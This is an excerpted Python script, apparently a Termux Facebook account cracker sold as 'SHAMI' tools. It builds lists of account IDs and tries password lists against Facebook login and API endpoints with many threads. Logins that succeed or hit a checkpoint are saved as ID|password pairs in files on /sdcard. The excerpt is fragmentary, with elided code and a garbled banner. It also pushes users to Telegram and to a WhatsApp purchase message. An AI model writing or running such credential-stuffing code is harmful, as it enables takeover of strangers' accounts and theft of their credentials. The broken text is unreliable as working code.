...
os.system('xdg-open https://t.me/MR_Y_A_D_A_404')
...
logo=("""\033[1;37m
  .+========================================================+
| ____ _ ____ |
|| _ \ ___ _ __ ___ | |__ __ _ / ___|_ __ __ ___ __|
|| |_) / _ \ '_ ` _ \| '_ \ / _` | | | _| '__/ _` \ \/ /|
|| __/ __/ | | | | | |_) | (_| | | |_| | | | (_| |> < |
||_| \___|_| |_| |_|_.__/ \__,_| \____|_| \__, /_/\_\|
| |___/ |
+========================================================+
----------------------------------------------
 Author    : Pemba Grg
 Github    : https://github.com/gr gxpemba33
 Facebook  : Pemba Gurung
 Tool Name : 6 BROTHERS
 Type type : FREE
 Version   : 0.0.1
----------------------------------------------
 PEMBAGRGX v3.1
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://t.me/MR_Y_A_D_A_404');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+923434810071&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi SHAMI Sir, I Need To Buy Your Paid SHAMI PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python SHAMI.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as SHAMI:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                SHAMI.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [SHAMI-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    ...
    'viewport-width': '980',
                        ...
                        SHAMI=session.cookies.get_dict().keys()
                        if "c_user" in SHAMI:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [SHAMI-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SHAMI-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in SHAMI:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [SHAMI-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SHAMI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [SHAMI-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SHAMI-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/SHAMI-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [SHAMI-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/SHAMI-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [SHAMI-OK] '+uid+' | '+pas+'\033[1;97m')
